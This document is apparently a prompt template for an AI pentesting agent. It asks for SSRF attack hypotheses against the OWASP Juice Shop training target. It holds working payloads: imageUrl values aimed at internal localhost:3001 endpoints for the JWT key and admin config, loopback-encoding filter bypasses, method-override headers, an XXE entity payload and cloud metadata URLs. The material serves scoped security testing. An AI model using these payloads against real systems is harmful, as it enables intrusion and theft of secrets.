# Phase 1e — SSRF Analysis

CRITICAL: The target is a REMOTE server at {{TARGET_URL}}.
Do NOT assume localhost. Do NOT use 127.0.0.1.
Use the provided {{TARGET_URL}} for ALL requests.

## Objective

Analyse the reconnaissance data and known vulnerabilities to produce **Server-Side Request Forgery (SSRF) attack hypotheses** targeting the OWASP Juice Shop at {{TARGET_URL}}. Focus on **URL-accepting parameters, file upload endpoints that fetch remote resources, XML parsers susceptible to XXE-based SSRF, and internal service enumeration via localhost access**.

Each hypothesis must be specific, actionable, and grounded in evidence from the recon phase. Do NOT guess — cite specific endpoints, parameters, and evidence.

## Input Data

### Recon Report

{{RECON_DATA}}

### Known Vulnerabilities

{{KNOWN_VULNS}}

## Analysis Instructions

1. **Identify all SSRF sinks** from the recon report — any endpoint that accepts a URL, fetches a remote resource, or processes XML:
   - Profile image upload endpoints that accept a URL parameter
   - File import/export endpoints (CSV, XML, PDF generation)
   - Webhook or callback URL configuration endpoints
   - B2B integration endpoints that parse XML payloads
   - Any parameter named `url`, `uri`, `path`, `src`, `href`, `callback`, `redirect`, `imageUrl`
2. **Cross-reference sinks with source code evidence** — the recon report's Identified Sinks section includes source file and line number. For each SSRF-related sink:
   - How is the URL parameter validated (allowlist, blocklist, regex, none)?
   - Is there any protocol restriction (http/https only, or any scheme)?
   - Does the server follow redirects (open redirect chaining)?
   - Is there a timeout or response size limit?
3. **Analyse internal service topology:**
   - Juice Shop typically runs its main server on port 3000
   - An internal API or service may be accessible on port 3001
   - Check for references to `localhost`, `127.0.0.1`, or internal hostnames in source code
   - Identify sensitive internal endpoints: `/encryptionkeys/`, `/rest/admin/`, `/api/`
4. **Analyse XML parsing for XXE-based SSRF:**
   - B2B order endpoints that accept XML input
   - Check if XML external entities are enabled
   - Check for DTD processing configuration
5. **Identify HTTP method bypass opportunities:**
   - Some endpoints may restrict SSRF via POST but allow it via PUT or PATCH
   - Check for method override headers (`X-HTTP-Method-Override`, `X-Method-Override`)
6. **Prioritise by exploitability:**
   - Profile image URL upload with method bypass (highest — known Juice Shop challenge)
   - Internal service access via localhost:3001 through SSRF
   - Encryption key exfiltration via SSRF to internal key endpoint
   - Admin configuration disclosure via SSRF
   - XXE-based SSRF through B2B order endpoint
   - Cloud metadata endpoint probe (lowest — safety constraints apply)

## SSRF Safety Constraints

**IMPORTANT:** SSRF payloads in this engagement must target ONLY the Juice Shop instance itself via localhost. Specifically:
- **ALLOWED:** `http://localhost:3001/...` and other loopback addresses targeting the Juice Shop's own internal services
- **ALLOWED:** `http://127.0.0.1:3001/...`, `http://[::1]:3001/...`, and IP encoding variants
- **NOT ALLOWED in default mode:** Cloud metadata endpoints such as `http://169.254.169.254/latest/meta-data/` — these must only be noted as theoretical risks, not actively probed unless explicitly authorised
- **NOT ALLOWED:** Targeting any external hosts or third-party services

## MANDATORY Hypotheses

Your output MUST include hypotheses for ALL of the following (at minimum):

1. **Profile image URL upload with HTTP method bypass** on `POST /profile/image/url` using PUT method — Shannon SSRF-VULN-01. The profile image endpoint may accept a URL pointing to an internal resource when the HTTP method is changed from POST to PUT.
2. **Internal service access via localhost** — submit `http://localhost:3001/` or `http://localhost:3001/api/` through the profile image URL parameter to enumerate internal services running on the Juice Shop host.
3. **Encryption key exfiltration** — use SSRF to fetch `http://localhost:3001/encryptionkeys/jwt.pub` through the profile image URL endpoint, potentially leaking the JWT public key used for token verification.
4. **Internal admin configuration disclosure** — use SSRF to access `http://localhost:3001/rest/admin/application-configuration` through the profile image URL endpoint, leaking internal application settings and challenge metadata.
5. **B2B order endpoint XXE-based SSRF** — submit a crafted XML payload to `POST /b2b/v2/orders` containing an external entity definition that fetches an internal resource (e.g., `<!ENTITY xxe SYSTEM "http://localhost:3001/encryptionkeys/jwt.pub">`).
6. **Cloud metadata endpoint probe (theoretical)** — note that `http://169.254.169.254/latest/meta-data/` could be probed via SSRF if the Juice Shop is hosted on a cloud provider. Document this as a theoretical risk only; do NOT actively test in default mode due to safety constraints.

## Hypothesis Format

For EACH hypothesis, use this EXACT format:

```markdown
### Hypothesis N
**Endpoint:** <METHOD> <full URL path>
**Parameter:** <parameter name or header>
**Attack Type:** <SSRF via URL parameter / SSRF via method bypass / XXE-based SSRF / SSRF internal enumeration>
**Payload:** <specific attack payload — URL or XML body>
**Expected Result:** <what a successful attack would produce — internal service response, key material, configuration data>
**Evidence from recon:** <reference to specific endpoint/sink from recon_report.md, including source file and line>
```

## Required Output

Produce a markdown document with the heading `## Hypotheses` followed by at least 6 numbered hypotheses. Example structure:

```markdown
## Hypotheses

### Hypothesis 1
**Endpoint:** PUT /profile/image/url
**Parameter:** imageUrl (JSON body)
**Attack Type:** SSRF via HTTP method bypass
**Payload:** {"imageUrl": "http://localhost:3001/"}
**Expected Result:** Server fetches the internal URL and returns the response or stores the fetched content as the profile image. Response may include internal service data or HTML page content.
**Evidence from recon:** Profile image upload endpoint identified in routes/profileImageUrlUpload.ts — URL parameter passed to HTTP request library without adequate validation when method is PUT.

### Hypothesis 2
**Endpoint:** PUT /profile/image/url
**Parameter:** imageUrl (JSON body)
**Attack Type:** SSRF internal resource exfiltration
**Payload:** {"imageUrl": "http://localhost:3001/encryptionkeys/jwt.pub"}
**Expected Result:** Server fetches the JWT public key from the internal encryption keys endpoint. The key material is stored as the profile image or returned in the response, enabling JWT forgery attacks.
**Evidence from recon:** /encryptionkeys/ directory identified in recon; internal port 3001 serves static assets and API routes.

### Hypothesis 3
...
```

## Payload Guidelines for SSRF Testing

### Profile Image URL Upload (HIGHEST PRIORITY):
- `{"imageUrl": "http://localhost:3001/"}` — basic internal access
- `{"imageUrl": "http://localhost:3001/encryptionkeys/jwt.pub"}` — key exfiltration
- `{"imageUrl": "http://localhost:3001/rest/admin/application-configuration"}` — config disclosure
- `{"imageUrl": "http://127.0.0.1:3001/"}` — alternative loopback
- `{"imageUrl": "http://[::1]:3001/"}` — IPv6 loopback
- `{"imageUrl": "http://0.0.0.0:3001/"}` — wildcard address

### HTTP Method Bypass Techniques:
- Change `POST` to `PUT` on `/profile/image/url`
- Add `X-HTTP-Method-Override: PUT` header to POST request
- Add `X-Method-Override: PUT` header to POST request
- Try `PATCH` method as additional bypass vector

### Localhost / Loopback Variants (for filter bypass):
- `http://localhost:3001/` — standard
- `http://127.0.0.1:3001/` — IPv4 loopback
- `http://[::1]:3001/` — IPv6 loopback
- `http://0.0.0.0:3001/` — wildcard bind address
- `http://0x7f000001:3001/` — hex-encoded 127.0.0.1
- `http://2130706433:3001/` — decimal-encoded 127.0.0.1
- `http://017700000001:3001/` — octal-encoded 127.0.0.1
- `http://localhost.localdomain:3001/` — FQDN variant

### XXE-Based SSRF via B2B Orders:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "http://localhost:3001/encryptionkeys/jwt.pub">
]>
<order>
  <item>&xxe;</item>
</order>
```

### Cloud Metadata (Theoretical Only — Do NOT test by default):
- `http://169.254.169.254/latest/meta-data/` — AWS
- `http://metadata.google.internal/computeMetadata/v1/` — GCP
- `http://169.254.169.254/metadata/instance` — Azure

Save the output as `hypotheses_ssrf.md` using the `save_deliverable` tool.
